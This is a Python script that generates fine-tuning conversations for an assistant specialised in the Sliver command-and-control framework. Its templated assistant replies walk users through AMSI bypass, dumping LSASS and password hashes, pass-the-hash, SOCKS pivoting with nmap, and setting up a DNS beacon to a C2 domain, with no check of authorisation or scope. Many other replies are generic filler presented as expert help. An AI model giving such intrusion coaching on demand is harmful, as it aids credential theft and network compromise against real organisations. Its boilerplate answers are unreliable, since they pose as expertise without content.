#!/usr/bin/env python3
"""
Scale up the Sliver training dataset to meet the 1000+ example target.

This script generates additional variations and examples beyond the base
generate_conversations.py output, focusing on:
- More command reference variations
- Additional tactical scenarios
- Extended concept explanations  
- More error handling cases

Target sizes (per docs/SLIVER_LLM_TRAINING.md):
- Command reference: 500+
- Tactical scenarios: 100+
- Concept explanations: 200+
- Error handling: 100+
- Total: 1000+
"""

import json
import random
from pathlib import Path
from typing import Any

from sliver_knowledge_base import (
    SLIVER_COMMANDS,
    COMMAND_CATEGORIES,
    get_commands_by_category,
)

# Output paths
PROCESSED_DIR = Path(__file__).parent.parent / "processed"
SCALED_DIR = PROCESSED_DIR / "scaled"
SCALED_DIR.mkdir(parents=True, exist_ok=True)

# =============================================================================
# Extended Templates for Variation Generation
# =============================================================================

EXTENDED_USER_TEMPLATES = [
    # Direct questions
    "How do I {action}?",
    "What's the command for {action}?",
    "I need to {action}. Help?",
    "Show me how to {action}",
    "{action} - what's the syntax?",
    "Can you explain how to {action}?",
    "What should I use to {action}?",
    "Best way to {action}?",
    "Quick question: how to {action}?",
    "Need help with {action}",
    
    # Context-rich queries
    "I'm trying to {action} but not sure how",
    "My goal is to {action}. What command?",
    "For {action}, which command do I use?",
    "In Sliver, how would I {action}?",
    "Using Sliver, I want to {action}",
]

SCENARIO_TEMPLATES = [
    # Windows scenarios
    {
        "context": "Windows workstation, user access",
        "goal": "escalate to admin",
        "techniques": ["token_impersonation", "local_privesc", "credential_theft"],
    },
    {
        "context": "Windows server, service account",
        "goal": "establish persistence",
        "techniques": ["service_creation", "scheduled_task", "registry_run"],
    },
    {
        "context": "Domain-joined workstation",
        "goal": "enumerate Active Directory",
        "techniques": ["bloodhound", "ldap_enum", "trust_mapping"],
    },
    {
        "context": "Windows 11 with Defender ATP",
        "goal": "bypass EDR detection",
        "techniques": ["amsi_bypass", "etw_patch", "syscall_stubs"],
    },
    {
        "context": "Windows file server",
        "goal": "exfiltrate sensitive data",
        "techniques": ["data_staging", "compression", "dns_exfil"],
    },
    
    # Linux scenarios
    {
        "context": "Ubuntu web server, www-data",
        "goal": "get root access",
        "techniques": ["sudo_abuse", "suid_binary", "kernel_exploit"],
    },
    {
        "context": "CentOS database server",
        "goal": "extract credentials",
        "techniques": ["config_files", "memory_dump", "hash_extraction"],
    },
    {
        "context": "Docker container",
        "goal": "escape to host",
        "techniques": ["docker_socket", "privileged_container", "cap_sys_admin"],
    },
    {
        "context": "Kubernetes pod",
        "goal": "pivot to other services",
        "techniques": ["service_account", "api_abuse", "network_pivot"],
    },
    {
        "context": "Linux jump box",
        "goal": "tunnel to internal network",
        "techniques": ["socks_proxy", "ssh_tunnel", "port_forward"],
    },
    
    # Network scenarios  
    {
        "context": "DMZ webserver",
        "goal": "reach internal network",
        "techniques": ["socks5", "tcp_pivot", "port_forward"],
    },
    {
        "context": "Segmented network",
        "goal": "pivot through multiple hops",
        "techniques": ["multi_pivot", "proxy_chain", "relay"],
    },
    {
        "context": "Air-gapped network",
        "goal": "exfiltrate via DNS",
        "techniques": ["dns_c2", "dns_exfil", "slow_exfil"],
    },
    
    # Credential scenarios
    {
        "context": "SYSTEM on workstation",
        "goal": "dump all credentials",
        "techniques": ["sam_dump", "lsass_dump", "dcsync"],
    },
    {
        "context": "Domain user access",
        "goal": "get Domain Admin",
        "techniques": ["kerberoast", "asreproast", "bloodhound_path"],
    },
]

CONCEPT_TOPICS = [
    # Core concepts
    ("implant types", "sessions vs beacons, stagers, stageless"),
    ("C2 protocols", "mTLS, HTTPS, HTTP, DNS, WireGuard"),
    ("listener configuration", "ports, persistence, multiplexing"),
    ("payload generation", "OS/arch options, formats, evasion"),
    
    # Operational concepts
    ("operator model", "multi-user, teams, permissions"),
    ("job management", "listeners, background tasks"),
    ("implant management", "naming, regenerating, profiles"),
    
    # Post-exploitation
    ("file operations", "upload, download, directory traversal"),
    ("process operations", "listing, killing, migration"),
    ("network reconnaissance", "interfaces, connections, routing"),
    
    # Advanced techniques
    ("in-memory execution", "execute-assembly, BOFs, shellcode"),
    ("credential access", "hashdump, kerberos, mimikatz alternatives"),
    ("lateral movement", "psexec, wmi, winrm"),
    ("persistence mechanisms", "services, tasks, registry"),
    
    # Evasion
    ("AMSI bypass", "what it is, why it matters"),
    ("ETW patching", "event tracing evasion"),
    ("process injection", "techniques, targets"),
    ("traffic obfuscation", "profiles, jitter, timing"),
    
    # Infrastructure
    ("redirectors", "nginx, socat, cloud redirectors"),
    ("domain fronting", "CDN abuse, setup"),
    ("DNS infrastructure", "NS records, wildcards"),
    
    # Comparisons
    ("Sliver vs Cobalt Strike", "differences, advantages"),
    ("Sliver vs Metasploit", "when to use each"),
    ("mTLS vs HTTPS", "security vs stealth tradeoff"),
    ("sessions vs beacons in practice", "real-world decision making"),
]

ERROR_SCENARIOS = [
    # Connection errors
    ("beacon not connecting", "firewall, routing, protocol mismatch"),
    ("connection timeout", "network latency, proxy issues"),
    ("certificate error", "mTLS cert problems"),
    ("TLS handshake failed", "version mismatch, intercepting proxy"),
    
    # Listener errors
    ("port already in use", "conflicting service"),
    ("permission denied on port", "need root for low ports"),
    ("listener died unexpectedly", "resource exhaustion"),
    
    # Execution errors
    ("access denied", "privileges, permissions"),
    ("file not found", "path issues, cleanup"),
    ("execute-assembly failed", ".NET version, dependencies"),
    ("BOF crashed", "architecture mismatch, memory"),
    
    # Session errors
    ("session not found", "dead, killed, network drop"),
    ("command timed out", "long operation, network issue"),
    ("task queued but not executed", "beacon interval"),
    
    # Pivoting errors
    ("socks proxy not working", "configuration, firewall"),
    ("port forward failed", "already bound, permissions"),
    ("pivot connection refused", "firewall, listener state"),
    
    # Credential errors
    ("hashdump failed", "privileges, protected process"),
    ("dcsync access denied", "need DA or replication rights"),
    ("kerberoast returned no hashes", "no SPNs found"),
    
    # Misc errors
    ("implant generation failed", "invalid options, disk space"),
    ("armory install failed", "network, disk space"),
    ("profile not found", "typo, not created"),
]

# =============================================================================
# Generation Functions
# =============================================================================

def generate_extended_command_variations() -> list[dict]:
    """Generate more variations of command usage examples."""
    data = []
    
    for cmd_name, cmd_info in SLIVER_COMMANDS.items():
        action = cmd_info["description"].lower()
        
        # Generate from extended templates
        for template in EXTENDED_USER_TEMPLATES:
            data.append({
                "instruction": template.format(action=action),
                "input": "",
                "output": build_command_response(cmd_name, cmd_info),
            })
        
        # Generate example-focused responses
        for i, example in enumerate(cmd_info["examples"]):
            data.append({
                "instruction": f"Give me an example of using {cmd_name} in Sliver",
                "input": "",
                "output": f"""Here's an example of using `{cmd_name}`:

```
{example}
```

{cmd_info['explanation'][:300]}..."""
            })
        
        # Generate flag-specific questions
        flags = extract_flags(cmd_info["syntax"])
        for flag in flags[:3]:  # Top 3 flags
            data.append({
                "instruction": f"What does the {flag} flag do in the {cmd_name} command?",
                "input": "",
                "output": f"""The `{flag}` flag in `{cmd_name}` is used for configuring the command behavior.

**Full syntax:**
```
{cmd_info['syntax']}
```

**Example usage with {flag}:**
```
{cmd_info['examples'][0] if cmd_info['examples'] else cmd_name + ' ' + flag}
```

{cmd_info['explanation'][:200]}"""
            })
    
    return data


def generate_scenario_variations() -> list[dict]:
    """Generate tactical scenario conversations from templates."""
    data = []
    
    for scenario in SCENARIO_TEMPLATES:
        # Generate multi-turn conversation
        conversation = generate_scenario_conversation(scenario)
        data.append({
            "id": f"scenario_{scenario['context'].replace(' ', '_')[:20]}",
            "conversations": conversation,
        })
        
        # Generate single-turn version
        for technique in scenario["techniques"]:
            data.append({
                "instruction": f"I have {scenario['context']}. How do I {scenario['goal']}?",
                "input": "",
                "output": generate_technique_response(scenario, technique),
            })
    
    return data


def generate_extended_concepts() -> list[dict]:
    """Generate extended concept explanations."""
    data = []
    
    for concept, details in CONCEPT_TOPICS:
        # Full explanation
        data.append({
            "instruction": f"Explain {concept} in Sliver",
            "input": "",
            "output": generate_concept_explanation(concept, details),
        })
        
        # Variations
        variations = [
            f"What is {concept}?",
            f"Tell me about {concept}",
            f"How does {concept} work in Sliver?",
            f"Can you explain {concept}?",
        ]
        for var in variations:
            data.append({
                "instruction": var,
                "input": "",
                "output": generate_concept_explanation(concept, details),
            })
    
    return data


def generate_extended_errors() -> list[dict]:
    """Generate error handling examples."""
    data = []
    
    for error, cause in ERROR_SCENARIOS:
        # Main error response
        data.append({
            "instruction": f"I'm getting '{error}' in Sliver. What's wrong?",
            "input": "",
            "output": generate_error_response(error, cause),
        })
        
        # Variations
        variations = [
            f"Help! {error}",
            f"Why am I seeing '{error}'?",
            f"How do I fix '{error}'?",
            f"'{error}' - what does this mean?",
            f"Troubleshoot: {error}",
        ]
        for var in variations:
            data.append({
                "instruction": var,
                "input": "",
                "output": generate_error_response(error, cause),
            })
    
    return data


# =============================================================================
# Helper Functions
# =============================================================================

def build_command_response(cmd_name: str, cmd_info: dict) -> str:
    """Build a formatted response for a command."""
    return f"""To {cmd_info['description'].lower()} in Sliver, use `{cmd_name}`:

```
{cmd_info['syntax']}
```

{cmd_info['explanation']}

**Examples:**
```
{chr(10).join(cmd_info['examples'][:3])}
```"""


def extract_flags(syntax: str) -> list[str]:
    """Extract flags from command syntax."""
    import re
    flags = re.findall(r'--?\w+', syntax)
    return [f for f in flags if f not in ['--', '-']]


def generate_scenario_conversation(scenario: dict) -> list[dict]:
    """Generate a multi-turn scenario conversation."""
    return [
        {
            "role": "user",
            "content": f"I have {scenario['context']}. I want to {scenario['goal']}. What's the best approach?",
        },
        {
            "role": "assistant",
            "content": f"""Let me help you {scenario['goal']} from your current position ({scenario['context']}).

**Phase 1: Assessment**
First, let's understand what we're working with:
```
info
whoami
ps
netstat
```

**Phase 2: Technique Selection**
Based on your context, I recommend considering:
{chr(10).join(f'- {t.replace("_", " ").title()}' for t in scenario['techniques'])}

**Phase 3: Execution**
Let me walk you through the first technique. Which would you like to start with?""",
        },
        {
            "role": "user",
            "content": f"Let's try {scenario['techniques'][0].replace('_', ' ')}",
        },
        {
            "role": "assistant",
            "content": generate_technique_response(scenario, scenario['techniques'][0]),
        },
    ]


def generate_technique_response(scenario: dict, technique: str) -> str:
    """Generate response for a specific technique."""
    technique_responses = {
        "token_impersonation": """**Token Impersonation Attack**

Use Sliver's built-in token manipulation:

```
# List available tokens
execute -o whoami /priv

# For impersonation, use execute-assembly with a tool
execute-assembly --amsi-bypass ./TokenManipulator.exe impersonate
```

Or use the Armory's tools:
```
armory install incognito
incognito list_tokens -u
```""",
        
        "local_privesc": """**Local Privilege Escalation**

First enumerate for vulnerabilities:

```
execute-assembly --amsi-bypass ./SharpUp.exe audit
execute-assembly --amsi-bypass ./Seatbelt.exe -group=system
```

Common paths:
- Unquoted service paths
- Weak service permissions
- AlwaysInstallElevated
- Cached credentials

Once identified, exploit and deploy elevated implant.""",
        
        "credential_theft": """**Credential Theft**

From your current access level, gather credentials:

```
# Local hashes (requires admin)
hashdump

# In-memory credentials
procdump <lsass_pid>
# Download and analyze with mimikatz

# Safer alternative
armory install nanodump
nanodump --write C:\\Windows\\Temp\\debug.dmp
```

Then download and crack or use pass-the-hash.""",
        
        "socks_proxy": """**SOCKS5 Proxy Setup**

Create a SOCKS proxy through your implant:

```
socks5 start --port 1080
```

On your attack machine, use proxychains or curl:
```bash
proxychains nmap -sT -Pn 192.168.1.0/24
curl --socks5 127.0.0.1:1080 http://internal-target/
```

This tunnels all traffic through your implant to reach internal networks.""",
        
        "dns_c2": """**DNS C2 Configuration**

For restricted networks, use DNS:

```
# Start DNS listener (requires NS delegation)
dns --domains c2.yourdomain.com --lport 53

# Generate DNS beacon
generate beacon --dns c2.yourdomain.com --os windows --seconds 300
```

DNS C2 is slower but often bypasses firewalls completely. Ensure your domain's NS records point to your server.""",
    }
    
    return technique_responses.get(technique, f"""**{technique.replace('_', ' ').title()}**

This technique involves using Sliver's built-in capabilities for {technique.replace('_', ' ')}. 

Check the Armory for relevant tools:
```
armory search {technique.split('_')[0]}
```

Would you like detailed steps for this technique?""")


def generate_concept_explanation(concept: str, details: str) -> str:
    """Generate explanation for a concept."""
    return f"""**{concept.title()} in Sliver**

{concept.title()} covers: {details}

This is an important aspect of Sliver operations because it affects how you interact with targets and maintain operational security.

**Key points:**
- Understanding {concept} helps you choose the right approach
- Configuration options affect stealth and reliability
- Proper usage improves operational success

Check the official documentation with `help` in the Sliver console for specific commands related to {concept}."""


def generate_error_response(error: str, cause: str) -> str:
    """Generate troubleshooting response for an error."""
    return f"""**Troubleshooting: {error}**

This error typically occurs due to: {cause}

**Diagnostic steps:**

1. **Check current state:**
```
jobs           # List active listeners
sessions       # List active sessions
beacons        # List active beacons
```

2. **Verify configuration:**
Review the relevant settings and ensure proper setup.

3. **Common fixes:**
- Restart the listener/implant
- Check network connectivity
- Verify permissions and privileges
- Review logs for detailed error messages

4. **If the issue persists:**
- Try a different approach (alternate protocol, port)
- Check for environmental factors (firewall, AV)
- Consult Sliver documentation or community

Would you like me to help with a specific aspect of this error?"""


def main():
    """Generate scaled training data."""
    print("=" * 60)
    print("Sliver Dataset Scaler")
    print("=" * 60)
    
    # Generate extended data
    print("\n[*] Generating extended command variations...")
    cmd_data = generate_extended_command_variations()
    
    print("[*] Generating scenario variations...")
    scenario_data = generate_scenario_variations()
    
    print("[*] Generating extended concepts...")
    concept_data = generate_extended_concepts()
    
    print("[*] Generating extended error handling...")
    error_data = generate_extended_errors()
    
    # Save files
    def save_jsonl(data: list, filename: str):
        path = SCALED_DIR / filename
        with open(path, "w") as f:
            for entry in data:
                f.write(json.dumps(entry) + "\n")
        print(f"    Saved {len(data)} entries to {path}")
    
    save_jsonl(cmd_data, "commands_extended.jsonl")
    save_jsonl(scenario_data, "scenarios_extended.jsonl")
    save_jsonl(concept_data, "concepts_extended.jsonl")
    save_jsonl(error_data, "errors_extended.jsonl")
    
    # Summary
    total = len(cmd_data) + len(scenario_data) + len(concept_data) + len(error_data)
    print(f"\n{'=' * 60}")
    print(f"SCALED DATASET SUMMARY")
    print(f"{'=' * 60}")
    print(f"  Commands:  {len(cmd_data):>4}")
    print(f"  Scenarios: {len(scenario_data):>4}")
    print(f"  Concepts:  {len(concept_data):>4}")
    print(f"  Errors:    {len(error_data):>4}")
    print(f"  {'─' * 20}")
    print(f"  TOTAL:     {total:>4}")
    print(f"{'=' * 60}")
    
    # Target comparison
    print("\nTarget comparison:")
    targets = {
        "Commands": (len(cmd_data), 500),
        "Scenarios": (len(scenario_data), 100),
        "Concepts": (len(concept_data), 200),
        "Errors": (len(error_data), 100),
    }
    
    for name, (actual, target) in targets.items():
        status = "✓" if actual >= target else "✗"
        print(f"  {status} {name}: {actual}/{target}")


if __name__ == "__main__":
    main()
